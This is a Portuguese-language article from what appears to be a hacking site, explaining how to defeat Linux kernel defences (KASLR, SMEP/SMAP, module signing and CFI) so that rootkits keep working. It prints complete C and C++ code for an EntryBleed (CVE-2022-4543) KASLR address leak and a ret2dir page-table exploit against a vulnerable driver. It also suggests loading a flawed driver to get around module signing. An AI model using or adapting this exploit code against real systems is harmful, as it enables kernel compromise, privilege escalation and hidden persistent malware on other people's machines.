<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="../../css/css-paper/paper.css">
    <link rel="shortcut icon" href="../../img/favicon.png" type="image/x-icon">
    <title>paper - Kernel Linux Bypass</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/xt256.min.css">
      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/c.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/x86asm.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/java.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/vbscript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/rust.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/json.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/yaml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/htmlbars.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/nginx.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/shell.min.js"></script>
  <script>
      hljs.highlightAll();
    //  hljs.configure({languages: []});
    </script>

</head>

<body>
    <div class="main_container">
        <header class="header_top">
            <div class="left-section">
                <a href="../../a/about.html" class="menu-link">[ 0xAb0ut-Us ]</a>
                <a href="../../c/contribute.html" class="menu-link">[ 0xContribut3 ]</a>
                <a href="../../w/worms.html" class="menu-link">[ 0xW0rms ]</a>
            </div>
            <div class="right-section">
                <span class="glitch-text">0xPwnbuff3r</span>
            </div>

        </header>

        <main class="content">
            <h1 class="pwntitle">Kernel Linux Bypass</h1>
            <article>
                  <p><strong>lights off &amp; black0ut on</strong></p>
                  <h3 id="1--introdução">1- Introdução</h3>
                  <p>Olá, Sejam bem vindos!!! Nesse artigo vou abordar
                  como as proteções modernas no Kernel Linux atrapalham
                  e mitigam as funções de rootkits e claro como ocorre o
                  seu bypass.</p>
                  <h3
                  id="2--kernel-address-space-layout-randomization-kaslr">2-
                  Kernel Address Space Layout Randomization (KASLR)</h3>
                  <p>Sendo uma das principais formas de defesa do Kernel
                  e em outros sistemas, ocorre a randomização dos
                  endereços de memória do kernel em cada boot
                  dificultando assim a exploração do atacante. Em
                  rootkits isto é prejudicial por conta da randomização
                  da <strong>sys_call_table</strong>, acarretando que
                  hooks em syscalls sejam mais difíceis, devido ao seu
                  endereço de memória aleatório.</p>
                  <p>Para contornar esse sistema existem alguns métodos,
                  como por exemplo:</p>
                  <p><strong>A CVE-2022-4543</strong>, também conhecida
                  como <strong>EntryBleed</strong>, é uma
                  vulnerabilidade no mecanismo de segurança
                  <strong>Kernel Page Table Isolation</strong> (KPTI) do
                  Linux, que permite a um atacante local vazar o
                  endereço base do <strong>KASLR</strong> (Kernel
                  Address Space Layout Randomization) em sistemas Intel.
                  Essa falha explora um canal lateral baseado em
                  temporização do TLB (Translation Lookaside Buffer)
                  para obter informações sensíveis do kernel,
                  comprometendo a aleatorização de memória crítica, por
                  meio do mapeamento da
                  <strong>entry_SYSCALL_64</strong>, que possui o mesmo
                  endereço no espaço de uer e no espaço do kernel, dessa
                  forma podemos usar o <strong>prefetchnta e
                  prefetcht2</strong> são usadas para medir o tempo de
                  acesso a endereços específicos, conseguindo obter o
                  endereço da syscall, esa falha ocorre principalmente
                  em processadores intel, segue abaixo um exploit para
                  exploração dessa vulnerabilidade:</p>
                  <p><img
                  src="https://dl.acm.org/cms/attachment/html/10.1145/3623652.3623669/assets/html/images/hasp23-6-fig1.jpg"
                  alt="1" /></p>
                  <h3
                  id="arquivoentrybleed_mainc">Arquivo:"entryBleed_main.c"</h3>
                  <pre class="C"><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;

uint64_t sidechannel(uint64_t addr)
{
    uint64_t a, b, c, d;
    asm volatile(&quot;.intel_syntax noprefix;&quot;
                 &quot;mfence;&quot;
                 &quot;rdtscp;&quot;
                 &quot;mov %0, rax;&quot;
                 &quot;mov %1, rdx;&quot;
                 &quot;xor rax, rax;&quot;
                 &quot;lfence;&quot;
                 &quot;prefetchnta qword ptr [%4];&quot;
                 &quot;prefetcht2 qword ptr [%4];&quot;
                 &quot;xor rax, rax;&quot;
                 &quot;lfence;&quot;
                 &quot;rdtscp;&quot;
                 &quot;mov %2, rax;&quot;
                 &quot;mov %3, rdx;&quot;
                 &quot;mfence;&quot;
                 &quot;.att_syntax;&quot;
                 : &quot;=r&quot;(a), &quot;=r&quot;(b), &quot;=r&quot;(c), &quot;=r&quot;(d)
                 : &quot;r&quot;(addr)
                 : &quot;rax&quot;, &quot;rbx&quot;, &quot;rcx&quot;, &quot;rdx&quot;);
    a = (b &lt;&lt; 32) | a;
    c = (d &lt;&lt; 32) | c;
    return c - a;
}

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100

uint64_t leak_syscall_entry(unsigned long long offset)
{
    unsigned long long STEP = 0x100000ull;
    unsigned long long SCAN_START = 0xffffffff80000000ull + offset, SCAN_END = 0xffffffffc0000000ull + offset;
    unsigned long long ARR_SIZE = (SCAN_END - SCAN_START) / STEP;

    uint64_t *data = (uint64_t *)malloc(sizeof(uint64_t) * ARR_SIZE);
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i &lt; ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx &lt; ARR_SIZE; idx++)
        {
            uint64_t test = SCAN_START + idx * STEP;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i &gt;= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i &lt; ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] &lt; min)
        {
            min = data[i];
            addr = SCAN_START + i * STEP;
        }
    }

    return addr;
}

int main(int argc, char **argv)
{
    if (argc != 2)
    {
        puts(&quot;[*] Usage: ./binary entry_SYSCALL_64_offset(in hex)&quot;);
        return -1;
    }

    char *p_end;

    unsigned long long entry_SYSCALL_64_offset = strtoull(argv[1], &amp;p_end, 16);

    printf(&quot;%llx&quot;, leak_syscall_entry(entry_SYSCALL_64_offset) - entry_SYSCALL_64_offset);

    return 0;
}
</code></pre>
                  <h3
                  id="arquivoentrybleed_cppcpp">Arquivo:"entryBleed_cpp.cpp"</h3>
                  <pre class="C"><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;string.h&gt;
#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include &lt;string&gt;
#include &lt;map&gt;

using namespace std;

void execute_cmd(const char *cmd, char *result)
{
    char buf_ps[1024];
    char ps[1024] = {0};
    FILE *ptr;
    strcpy(ps, cmd);
    if ((ptr = popen(ps, &quot;r&quot;)) != NULL)
    {
        while (fgets(buf_ps, 1024, ptr) != NULL)
        {
            strcat(result, buf_ps);
            if (strlen(result) &gt; 1024)
                break;
        }
        pclose(ptr);
        ptr = NULL;
    }
    else
    {
        printf(&quot;popen %s error\n&quot;, ps);
    }
}

int main(int argc, char **argv)
{
    if (argc != 4)
    {
        puts(&quot;[*] Usage: ./binary dekaslr_path entry_SYSCALL_64_offset(in hex) max_loop&quot;);
        return -1;
    }

    string dekaslr_path = argv[1];
    string koffset = argv[2];
    string max_loop = argv[3];
    string cmd = dekaslr_path + &quot; &quot; + koffset;

    char result[0x1000] = {0};
    int max_tries = stoi(max_loop);

    map&lt;string, unsigned int&gt; base_record;

    for (size_t i = 0; i &lt; max_tries; i++)
    {
        memset(result, 0, 0x100);
        execute_cmd(cmd.c_str(), result);
        // printf(&quot;%s\n&quot;, result);
        string key = result;
        if (base_record.find(key) != base_record.end())
        {
            base_record[key]++;
        }
        else
        {
            base_record[key] = 1;
        }
    }

    map&lt;string, unsigned int&gt;::iterator iter;
    unsigned int max_cnt = 0;

    for (iter = base_record.begin(); iter != base_record.end(); iter++)
    {
        if (iter-&gt;second &gt; max_cnt)
        {
            max_cnt = iter-&gt;second;
        }
    }

    string kernel_base;
    for (iter = base_record.begin(); iter != base_record.end(); iter++)
    {
        if (iter-&gt;second == max_cnt)
        {
            kernel_base = iter-&gt;first;
            cout &lt;&lt; &quot;0x&quot; &lt;&lt; kernel_base &lt;&lt; &quot;: &quot; &lt;&lt; max_cnt &lt;&lt; &quot;/&quot; &lt;&lt; max_tries &lt;&lt; endl;
            break;
        }
    }

    return 0;
}</code></pre>
                  <h3
                  id="3--supervisor-mode-execution-prevention-smep-e-supervisor-mode-access-prevention-smap">3-
                  Supervisor Mode Execution Prevention (SMEP) e
                  Supervisor Mode Access Prevention (SMAP)</h3>
                  <p>Mais um sistema de proteção de mecanismos de
                  segurança baseados em hardware (CPU) que protegem o
                  kernel de ataques que tentam explorar a interação
                  entre o modo kernel (privilegiado) e o modo usuário
                  (não privilegiado)</p>
                  <p>O <strong>SMEP</strong> impede que o kernel execute
                  código localizado na memória do espaço do usuário
                  (userland) e bloqueia ataques que tentam redirecionar
                  a execução do kernel para código malicioso residente
                  em regiões não privilegiadas por meio do registrador
                  CR4 (x86_64): O bit 20 do registrador CR4 controla o
                  <strong>SMEP</strong>. Se habilitado, a CPU gera uma
                  exceção (General Protection Fault, #GP) se o kernel
                  tentar executar instruções em páginas de memória
                  marcadas como "userland" (não privilegiadas). Marcação
                  de páginas: O bit User/Supervisor (bit 2) na entrada
                  da tabela de páginas (PTE) define se uma página
                  pertence ao usuário (U=1) ou ao kernel (U=0). Isto se
                  torna complicado para rootkits pois bloqueia a injeção
                  de shellcode em userland e exige que rootkits usem
                  técnicas mais complexas como ROP</p>
                  <p>O <strong>SMAP</strong> bloqueia o acesso do kernel
                  a páginas de memória do espaço do usuário durante
                  operações privilegiadas e impede que dados controlados
                  pelo usuário sejam usados para corromper estruturas do
                  kernel ou vazar informações sensíveis. Como funciona
                  no low level?</p>
                  <ul>
                  <li><code>stac (Set AC Flag):</code> Permite
                  temporariamente acesso a userland (usado em funções
                  como copy_from_user).</li>
                  <li><code>clac (Clear AC Flag):</code> Restaura a
                  proteção do SMAP.</li>
                  <li><code>AC Flag:</code> Quando SMAP está ativo, a
                  CPU verifica a flag AC (bit 18 no registrador RFLAGS).
                  Se AC=0, acessos a Userland são bloqueados.</li>
                  </ul>
                  <p>E rootkits isto é péssimo pois impede que rootkits
                  usem dados do userland para manipular o kernel
                  dificulta ataques de corrupção de memória que dependem
                  de ponteiros controlados pelo usuário. Uma das formas
                  de contornar esses sistemas é por meio ret2dir, dessa
                  forma o atacante aloca grandes quantidades de memória
                  no espaço do usuário, forçando o kernel a mapear essas
                  páginas no <strong>physmap</strong>. Como o physmap é
                  compartilhado entre userland e kernel, dados
                  controlados pelo atacante podem residir em endereços
                  conhecidos do kernel. O atacante aloca múltiplas
                  páginas na userland, via mmap e as preenche com código
                  malicioso (shellcode). isto é útil pois o SMAP e SMEP
                  não impedem a execução do physmap. segue abaixo um
                  código com esse objetivo:</p>
                  <p><img
                  src="https://figures.semanticscholar.org/1de5ae8534fc76323e4d926e10dc0fc76a28a361/5-Figure2-1.png"
                  alt="ret2dir" /></p>
                  <h3 id="arquivoret2dirc">Arquivo:"ret2dir.c"</h3>
                  <pre class="C"><code>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/fcntl.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/stat.h&gt;

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333
#define VULN_PGD 0x4444

struct rwRequest {
    void *kaddr;
    void *uaddr;
    size_t length;
};

unsigned long pageOffsetBase = 0xffff888000000000;

int Open(char *fname, int mode) {
    int fd;
    if ((fd = open(fname, mode)) &lt; 0) {
        perror(&quot;open&quot;);
        exit(-1);
    }
    return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

    struct rwRequest req;
    unsigned long value_ = value;

    req.uaddr = &amp;value_;
    req.length = 8;
    req.kaddr = (void *)kaddr;

    int fd = Open(&quot;/dev/vuln&quot;, O_RDONLY);

    if (ioctl(fd, VULN_WRITE, &amp;req) &lt; 0) {
        perror(&quot;ioctl&quot;);
        exit(-1);
    }
}

unsigned long read64(unsigned long kaddr) {

    struct rwRequest req;
    unsigned long value;;

    req.uaddr = &amp;value;
    req.length = 8;
    req.kaddr = (void *)kaddr;

    int fd = Open(&quot;/dev/vuln&quot;, O_RDONLY);

    if (ioctl(fd, VULN_READ, &amp;req) &lt; 0) {
        perror(&quot;ioctl&quot;);
        exit(-1);
    }
    return value;
}

unsigned long leak_stack() {
    struct rwRequest req;
    unsigned long stack;

    int fd = Open(&quot;/dev/vuln&quot;, O_RDONLY);

    req.uaddr = &amp;stack;
    if (ioctl(fd, VULN_STACK, &amp;req) &lt; 0) {
        perror(&quot;ioctl&quot;);
        exit(-1);
    }

    return stack;
}

unsigned long leak_pgd() {
    struct rwRequest req;
    unsigned long pgd = 0xcccccccc;

    int fd = Open(&quot;/dev/vuln&quot;, O_RDONLY);

    req.uaddr = &amp;pgd;
    if (ioctl(fd, VULN_PGD, &amp;req) &lt; 0) {
        perror(&quot;ioctl&quot;);
        exit(-1);
    }

    return pgd;
}

unsigned long find_synonym(unsigned long pgdir, unsigned long vaddr) {

    unsigned long index1 = (vaddr &gt;&gt; 39) &amp; 0x1ff;
    unsigned long index2 = (vaddr &gt;&gt; 30) &amp; 0x1ff;
    unsigned long index3 = (vaddr &gt;&gt; 21) &amp; 0x1ff;
    unsigned long index4 = (vaddr &gt;&gt; 12) &amp; 0x1ff;

    printf(&quot;index1: %lx, index2: %lx, index3: %lx index4: %lx\n&quot;, index1, index2, index3, index4);
    
    unsigned long lv1 = read64(pgdir + index1*8);
    if (!lv1) {
        printf(&quot;[!] lv1 is invalid\n&quot;);
        exit(-1);
    }
    printf(&quot;lv1: %lx\n&quot;, lv1);
    unsigned long lv2 = read64((((lv1 &gt;&gt; 12) &amp; 0x3fffffff) &lt;&lt; 12) + pageOffsetBase + index2*8);
    if (!lv2) {
        printf(&quot;[!] lv2 is invalid\n&quot;);
        exit(-1);
    }
    printf(&quot;lv2: %lx\n&quot;, lv2);
    
    unsigned long lv3 = read64((((lv2 &gt;&gt; 12) &amp; 0x3fffffff) &lt;&lt; 12) + pageOffsetBase + index3*8);
    if (!lv3) {
        printf(&quot;[!] lv3 is invalid\n&quot;);
        exit(-1);
    }
    printf(&quot;lv3: %lx\n&quot;, lv3);

    unsigned long lv4 = read64((((lv3 &gt;&gt; 12) &amp; 0x3fffffff) &lt;&lt; 12) + pageOffsetBase + index4*8);
    if (!lv4) {
        printf(&quot;[!] lv3 is invalid\n&quot;);
        exit(-1);
    }
    printf(&quot;lv4: %lx\n&quot;, lv4);
    
    unsigned long vaddr_alias = (((lv4 &gt;&gt; 12) &amp; 0x3fffffff) &lt;&lt; 12) + pageOffsetBase;
    return vaddr_alias;
}

unsigned long pageTableWalk(unsigned long pgdir, unsigned long vaddr) {

    unsigned long index1 = (vaddr &gt;&gt; 39) &amp; 0x1ff;
    unsigned long index2 = (vaddr &gt;&gt; 30) &amp; 0x1ff;
    unsigned long index3 = (vaddr &gt;&gt; 21) &amp; 0x1ff;
    unsigned long index4 = (vaddr &gt;&gt; 12) &amp; 0x1ff;

    printf(&quot;index1: %lx, index2: %lx, index3: %lx index4: %lx\n&quot;, index1, index2, index3, index4);
    
    unsigned long lv1 = read64(pgdir + index1*8);
    if (!lv1) {
        printf(&quot;[!] lv1 is invalid\n&quot;);
        exit(-1);
    }
    printf(&quot;lv1: %lx\n&quot;, lv1);
    unsigned long lv2 = read64((((lv1 &gt;&gt; 12) &amp; 0x3fffffff) &lt;&lt; 12) + pageOffsetBase + index2*8);
    if (!lv2) {
        printf(&quot;[!] lv2 is invalid\n&quot;);
        exit(-1);
    }
    printf(&quot;lv2: %lx\n&quot;, lv2);
    
    unsigned long lv3 = read64((((lv2 &gt;&gt; 12) &amp; 0x3fffffff) &lt;&lt; 12) + pageOffsetBase + index3*8);
    if (!lv3) {
        printf(&quot;[!] lv3 is invalid\n&quot;);
        exit(-1);
    }
    printf(&quot;lv3: %lx\n&quot;, lv3);

    unsigned long lv4 = read64((((lv3 &gt;&gt; 12) &amp; 0x3fffffff) &lt;&lt; 12) + pageOffsetBase + index4*8);
    if (!lv4) {
        printf(&quot;[!] lv3 is invalid\n&quot;);
        exit(-1);
    }
    printf(&quot;lv4: %lx\n&quot;, lv4);
    
    unsigned long vaddr_alias = (((lv4 &gt;&gt; 12) &amp; 0x3fffffff) &lt;&lt; 12) + pageOffsetBase;
    printf(&quot;vaddr alias page: %p\n&quot;, (void *)vaddr_alias);
    unsigned long pte_addr = (((lv3 &gt;&gt; 12) &amp; 0x3fffffff) &lt;&lt; 12) + pageOffsetBase + index4*8;
    printf(&quot;pte address: %p\n&quot;, (void *)pte_addr);
    
    return pte_addr;
}

int main (int argc, char **argv){
    
    void *rwx = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    if (rwx == MAP_FAILED) {
        perror(&quot;mmap&quot;);
        exit(-1);
    }

    void *rw = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    if (rw == MAP_FAILED) {
        perror(&quot;mmap&quot;);
        exit(-1);
    }

    memset(rwx, 0xcc, 0x1000);
    memset(rw, 0xcc, 0x1000);

    unsigned long pgd = leak_pgd();

    printf(&quot;[*] page directory is at: %p\n&quot;, (void *)pgd);

    unsigned long rwx_pte = pageTableWalk(pgd, find_synonym(pgd,rwx));
    unsigned long rw_pte = pageTableWalk(pgd, find_synonym(pgd,rw));


    printf(&quot;[*] RWX: %lx\n&quot;, read64(rwx_pte));
    printf(&quot;[*] RW : %lx\n&quot;, read64(rw_pte));
    return 0;
}</code></pre>
                  <h3 id="4--assinaturas-módulo-de-kernels">4-
                  Assinaturas módulo de Kernels</h3>
                  <p>A Assinatura de Módulos do Kernel (com SHA-512 como
                  padrão) é um mecanismo de segurança integrado ao Linux
                  que garante que apenas módulos do kernel (arquivos
                  .ko) assinados digitalmente por uma chave confiável
                  possam ser carregados. Esse recurso é essencial para
                  evitar a injeção de código malicioso (como rootkits)
                  ou módulos não autorizados no kernel, especialmente em
                  sistemas com Secure Boot habilitado.</p>
                  <h4 id="as-formas-de-bypass-incluem">As formas de
                  bypass incluem:</h4>
                  <p><strong>Secure Boot Desabilitado</strong>: Módulos
                  não assinados podem ser carregados via
                  <code>insmod --force</code> <strong>Chaves
                  Personalizadas</strong>: Sistemas podem usar chaves
                  locais, mas isso exige recompilar o kernel. instalar
                  um driver com falhas que podem ser explorados,
                  basicamente a instalação de uma vulnerabilidade na
                  máquina (ex: CVE-2021-3490).</p>
                  <h3 id="5--integridade-de-fluxo-de-controle-cfi">5-
                  Integridade de Fluxo de Controle (CFI)</h3>
                  <p>é um mecanismo de segurança que é configurado para
                  proteger programas e sistemas contra explorações que
                  descarrilam o fluxo de execução legítimo, como
                  <strong>Programação Orientada a Retorno</strong> (ROP)
                  e Programação Orientada a Salto (JOP). Ele garante que
                  o fluxo de controle (chamadas de função, retornos,
                  saltos) tome apenas caminhos predefinidos válidos,
                  evitando assim que invasores sequestrem a execução
                  para código malicioso. Para contornar esse sistema
                  existem as seguintes tecnicas:</p>
                  <ul>
                  <li><p>A. Ataques a Implementações
                  "Coarse-Grained"<br />
                  <strong>Problema</strong>: CFI "coarse-grained" agrupa
                  muitos destinos válidos em categorias amplas.<br />
                  <strong>Exemplo</strong>: Se todas as funções que
                  retornam int forem consideradas válidas, um atacante
                  pode redirecionar para qualquer uma delas.<br />
                  <strong>Ferramentas Afetadas:</strong> Versões antigas
                  do Clang CFI e Microsoft CFG.</p></li>
                  <li><p>B. Memory Corruption Primitive + CFI
                  Weakening<br />
                  <strong>Mecanismo</strong>: Combinar corrupção de
                  memória (ex: buffer overflow) com falhas no CFI.<br />
                  <strong>Exemplo</strong>: Corromper uma estrutura de
                  dados (ex: struct file_operations) para redirecionar
                  fluxo para gadgets permitidos pelo CFI.<br />
                  <strong>Caso</strong>: WarpAttack usou double-fetches
                  (acessos duplos à memória) para criar condições de
                  corrida e burlar verificações.</p></li>
                  <li><p>C. ROP/JOP Dentro de Limites Permitidos<br />
                  <strong>Mecanismo</strong>: Construir cadeias ROP/JOP
                  usando apenas gadgets em regiões marcadas como válidas
                  pelo CFI.<br />
                  <strong>Exemplo</strong>: Counterfeit Object-Oriented
                  Programming (COOP) usa chamadas legítimas de objetos
                  para atingir fins maliciosos.</p></li>
                  <li><p>D. Abuso de APIs ou Funções Legítimas<br />
                  <strong>Mecanismo</strong>: Chamar funções válidas do
                  sistema com argumentos manipulados.<br />
                  <strong>Exemplo</strong>: Usar system() ou execve()
                  com parâmetros controlados pelo atacante.<br />
                  Desta forma podemos fazer nosso rootkit ficar mais
                  sofisticado e robusto.</p></li>
                  </ul>
                  <h3 id="6--conclusão">6- Conclusão</h3>
                  <p>concluo esse artigo afirmando que o Kernel hacking
                  é uma área extremamente grande, e que é uma guerra
                  constante na sostificação de defesas contra os
                  atacantes, e o conteúdo mostrado se refere a algumas
                  técnicas para contornar as defesas do Kernel Linux,
                  portanto há inúmeras maneiras de se fazer isso. Então
                  é isso muito obrigado!!!</p>
                  <p><strong>lights on &amp; black0ut out</strong></p>
            </article>
            
            <a href="/PwnBuffer/index.html" class="back-link">← Voltar para a página principal</a>
        </main>

        <footer class="footer">
            <div class="footer-content">
                <span>&copy; 2025 - pwnbuffer.org </span>
                <span class="footer-separator">|</span>
                <a href="https://www.freebsd.org/" target="_blank" class="footer-link">[ Discord ]</a>
                <span class="footer-separator">|</span>
                <a href="https://github.com/" target="_blank" class="footer-link">[ X ] </a>
        </footer>
    </div>

</body>
<script>
    document.addEventListener("DOMContentLoaded", () => {
        const els = document.querySelectorAll(".glitch-text, .pwntitle");
        const chars = "\u0025\u0023\u0024\u0040\u005E\u0026\u002A\u0021\u003F\u003C\u002D\u003E\u002B\u007C\u002A";

        els.forEach(el => {
            const originalText = el.textContent;

            function glitchEffect() {
                let iterations = 0;
                const interval = setInterval(() => {
                    el.textContent = originalText
                        .split("")
                        .map((letter, index) => {
                            if (index < iterations) {
                                return originalText[index];
                            }
                            return chars[Math.floor(Math.random() * chars.length)];
                        })
                        .join("");

                    iterations += 1 / 2;

                    if (iterations >= originalText.length) {
                        clearInterval(interval);
                        el.textContent = originalText;
                    }
                }, 50);
            }

            setInterval(glitchEffect, 12000);
        });
    });
</script>

</html>
